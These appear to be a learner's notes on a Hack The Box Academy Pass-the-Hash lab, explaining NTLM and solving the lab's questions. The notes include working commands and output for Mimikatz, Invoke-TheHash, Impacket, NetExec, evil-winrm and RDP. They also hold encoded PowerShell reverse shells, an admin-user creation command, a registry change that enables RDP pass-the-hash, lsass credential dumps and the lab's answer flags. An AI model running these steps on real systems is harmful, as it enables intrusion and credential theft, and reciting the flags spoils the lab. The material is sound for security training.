# Pass the Hash (PtH)

A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

The attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

- Dumping the local SAM database from a compromised host.
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
- Pulling the hashes from memory (lsass.exe).

## Introduction to Windows NTLM
[Microsoft's Windows New Technology LAN Manager (NTLM)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.

With NTLM, passwords stored on the server and domain controller are not "salted", which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a **Pass the Hash (PtH) Attack**.

## Pass the Hash with Mimikatz (Windows)
The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https://github.com/gentilkiwi). Mimikatz has a module named `sekurlsa::pth` that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:

- `/user` - The user name we want to impersonate.
-`/rc4` or `/NTLM` - NTLM hash of the user's password.
-`/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

### Pass the Hash from Windows Using Mimikatz

```cmd
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. 

When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

- Target - Hostname or IP address of the target.
- Username - Username to use for authentication.
- Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
- Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

### Invoke-TheHash with SMB
The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.

```pwsh
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

### Invoke-TheHash with WMI
We can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is **172.16.1.10**, we will use the machine name **DC01** (either would work).

```pwsh
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

[+] Command executed with process id 520 on DC01
```

## Pass the Hash with Impacket (Linux)
### Pass the Hash with Impacket PsExec

```sh
masterofblafu@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

## Pass the Hash with NetExec (Linux)
[NetExec](https://github.com/Pennyw0rth/NetExec) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use NetExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin. 

### Pass the Hash with NetExec

```sh
masterofblafu@htb[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see `Pwn3d!`, it means that the user is a local administrator on the target computer. We can use the option `-x` to execute commands. It is common to see password reuse against many hosts in the same subnet.

### NetExec - Command Execution

```sh
masterofblafu@htb[/htb]# netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator
```

## Pass the Hash with evil-winrm (Linux)
If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.

### Pass the Hash with evil-winrm
  
```sh
masterofblafu@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

> **Note:** When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

## Pass the Hash with RDP (Linux)
We can perform an RDP PtH attack to gain GUI access to the target system using tools like **xfreerdp**.

There are a few caveats to this attack:

- **Restricted Admin Mode**, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error: "Account restrictions are preventing this user from signing in."

### Enable Restricted Admin Mode to allow PtH
This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of `0`.

```cmd
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Pass the Hash using RDP
Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:

```sh
masterofblafu@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
...snip...
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
```

## UAC limits Pass the Hash for local accounts
UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to `0`, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to `1` allows the other local admins as well.

> **Note:** There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value `1`), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer.

## Questions
Authenticate to **10.129.15.20** (ACADEMY-PWATTACKS-LM-MS01) with user `Administrator` and password `30B3783CE2ABF1AF70F77D0660CF3453`
1. Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt. **Answer: G3t_4CCE$$_V1@_PTH**
   - `$ xfreerdp /v:10.129.15.20 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453` → Try the RDP PtH attack but got this error: "Account restrictions are preventing this user from signing in."
   - Enable restricted admin mode to allow PtH and try the RDP PtH attack again (and it works):
        ```sh
        $ evil-winrm -i 10.129.15.20 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
                                        
        Evil-WinRM shell v3.5
                                                
        Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                                
        Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                                
        Info: Establishing connection to remote endpoint
        *Evil-WinRM* PS C:\Users\Administrator\Documents> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
        The operation completed successfully.
        ```
   - Read the content of `C:\pth.txt`
2. Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer. **Answer: DisableRestrictedAdmin**
3. Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account? **Answer: c39f2beb3d2ec06a62cb887fb391dee0**
   - Run mimikatz with `sekurlsa::logonpasswords` module and read the NTLM hash:
        ```cmd
        C:\Tools> mimikatz.exe

        .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
        .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
        ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
        ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
        '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
        '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

        mimikatz # privilege::debug
        Privilege '20' OK

        mimikatz # sekurlsa::logonpasswords

        <SNIP>

        Authentication Id : 0 ; 373273 (00000000:0005b219)
        Session           : Service from 0
        User Name         : david
        Domain            : INLANEFREIGHT
        Logon Server      : DC01
        Logon Time        : 3/1/2026 11:16:09 PM
        SID               : S-1-5-21-3325992272-2815718403-617452758-1107
                msv :
                [00000003] Primary
                * Username : david
                * Domain   : INLANEFREIGHT
                * NTLM     : c39f2beb3d2ec06a62cb887fb391dee0
                * SHA1     : 2277c28035275149d01a8de530cc13b74f59edfb
                * DPAPI    : eaa6db50c1544304014d858928d9694f
                tspkg :
                wdigest :
                * Username : david
                * Domain   : INLANEFREIGHT
                * Password : (null)
                kerberos :
                * Username : david
                * Domain   : INLANEFREIGHT.HTB
                * Password : (null)
                ssp :
                credman :

        <SNIP>
        ```
4. Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt. **Answer: D3V1d_Fl5g_is_Her3**
   - `C:\Tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight /run:cmd.exe" exit` → Perform PtH attack to run cmd.exe as David
   - Read the flag in shared folder `\\DC01\\david`:
        ```cmd
        C:\Windows\system32>dir \\DC01\david
        Volume in drive \\DC01\david has no label.
        Volume Serial Number is B8B3-0D72

        Directory of \\DC01\david

        07/14/2022  03:07 PM    <DIR>          .
        07/14/2022  03:07 PM    <DIR>          ..
        07/14/2022  03:07 PM                18 david.txt
                    1 File(s)             18 bytes
                    2 Dir(s)  18,265,776,128 bytes free

        C:\Windows\system32>type \\DC01\david\david.txt
        D3V1d_Fl5g_is_Her3
        ```
5. Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt. **Answer:**
   - Run mimikatz with `sekurlsa::logonpasswords` module and read the NTLM hash:
        ```cmd
        C:\Tools> mimikatz.exe

        .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
        .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
        ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
        ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
        '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
        '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

        mimikatz # privilege::debug
        Privilege '20' OK

        mimikatz # sekurlsa::logonpasswords

        <SNIP>

        Authentication Id : 0 ; 416849 (00000000:00065c51)
        Session           : Service from 0
        User Name         : julio
        Domain            : INLANEFREIGHT
        Logon Server      : DC01
        Logon Time        : 3/2/2026 1:27:53 AM
        SID               : S-1-5-21-3325992272-2815718403-617452758-1106
                msv :
                [00000003] Primary
                * Username : julio
                * Domain   : INLANEFREIGHT
                * NTLM     : 64f12cddaa88057e06a81b54e73b949b
                * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
                * DPAPI    : 634db497baef212b777909a4ccaaf700
                tspkg :
                wdigest :
                * Username : julio
                * Domain   : INLANEFREIGHT
                * Password : (null)
                kerberos :
                * Username : julio
                * Domain   : INLANEFREIGHT.HTB
                * Password : (null)
                ssp :
                credman :

        <SNIP>
        ```
   - `C:\Tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight /run:cmd.exe" exit` → Perform PtH attack to run cmd.exe as Julio
   - Read the flag in shared folder `\\DC01\\julio`:
        ```cmd
        C:\Windows\system32>dir \\DC01\julio
        Volume in drive \\DC01\julio has no label.
        Volume Serial Number is B8B3-0D72

        Directory of \\DC01\julio

        07/14/2022  06:25 AM    <DIR>          .
        07/14/2022  06:25 AM    <DIR>          ..
        07/14/2022  03:18 PM                17 julio.txt
                    1 File(s)             17 bytes
                    2 Dir(s)  18,266,021,888 bytes free

        C:\Windows\system32>type \\DC01\julio\julio.txt
        JuL1()_SH@re_fl@g
        ```
6. Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt. **Answer: JuL1()_N3w_fl@g**
   - `C:\Tools> nc.exe -nlvp 8001` → Start listener on MS01 port 8001
   - Start a PtH attack using Invoke-TheHash with WMI to establish a reverse shell to MS01:8001:
        ```cmd
        Invoke-WMIExec -Target DC01 -Domain inlanefreight -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAbQBzADAAMQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
        ```
    - Read the flag using the established reverse shell:
        ```cmd
        C:\tools>nc.exe -nlvp 8001
        listening on [any] 8001 ...
        connect to [172.16.1.5] from (UNKNOWN) [172.16.1.10] 49781
        whoami
        inlanefreight\julio
        PS C:\Windows\system32> cd ../..
        PS C:\> dir


            Directory: C:\


        Mode                LastWriteTime         Length Name
        ----                -------------         ------ ----
        d-----        7/18/2022   8:19 AM                john
        d-----        7/18/2022   8:54 AM                julio
        d-----        2/25/2022  10:20 AM                PerfLogs
        d-r---        10/6/2021   3:50 PM                Program Files
        d-----        7/18/2022  11:00 AM                Program Files (x86)
        d-----        10/6/2022   9:46 AM                SharedFolder
        d-----        9/22/2022   1:19 PM                tools
        d-r---        10/6/2022   6:46 AM                Users
        d-----       10/10/2022   5:48 AM                Windows


        PS C:\> cd julio
        PS C:\julio> dir


            Directory: C:\julio


        Mode                LastWriteTime         Length Name
        ----                -------------         ------ ----
        -a----        7/14/2022   4:12 PM             15 flag.txt


        PS C:\julio> type flag.txt
        JuL1()_N3w_fl@g
        ```
7. Optional: John is a member of Remote Management Users for MS01. Try to connect to MS01 using john's account hash with impacket. What's the result? What happen if you use evil-winrm?. Mark DONE when finish. **Answer: DONE**
   - Run mimikatz with `sekurlsa::logonpasswords` module and read the NTLM hash:
        ```cmd
        C:\Tools> mimikatz.exe

        .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
        .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
        ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
        ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
        '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
        '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

        mimikatz # privilege::debug
        Privilege '20' OK

        mimikatz # sekurlsa::logonpasswords

        <SNIP>

        Authentication Id : 0 ; 372694 (00000000:0005afd6)
        Session           : Service from 0
        User Name         : john
        Domain            : INLANEFREIGHT
        Logon Server      : DC01
        Logon Time        : 3/2/2026 2:22:09 AM
        SID               : S-1-5-21-3325992272-2815718403-617452758-1108
                msv :
                [00000003] Primary
                * Username : john
                * Domain   : INLANEFREIGHT
                * NTLM     : c4b0e1b10c7ce2c4723b4e2407ef81a2
                * SHA1     : 31f8f4dfcb16205363b35055ebe92a75f0a19ce3
                * DPAPI    : 2e54e60846c83d96cf8d9523b5c0df61
                tspkg :
                wdigest :
                * Username : john
                * Domain   : INLANEFREIGHT
                * Password : (null)
                kerberos :
                * Username : john
                * Domain   : INLANEFREIGHT.HTB
                * Password : (null)
                ssp :
                credman :

        <SNIP>
        ```
    - PtH attack via **evil-winrm** works but via **impacket-psexec** not: 
        ```sh
        $ impacket-psexec john@10.129.15.37 -hashes :c4b0e1b10c7ce2c4723b4e2407ef81a2
        Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

        [*] Requesting shares on 10.129.15.37.....
        [-] share 'ADMIN$' is not writable.
        [-] share 'C$' is not writable.
        ```
    - This is because **impacket-psexec** requires Local admin on the target to connect to admin shares like `ADMIN$` or `C$` to upload a service binary and retrieve output.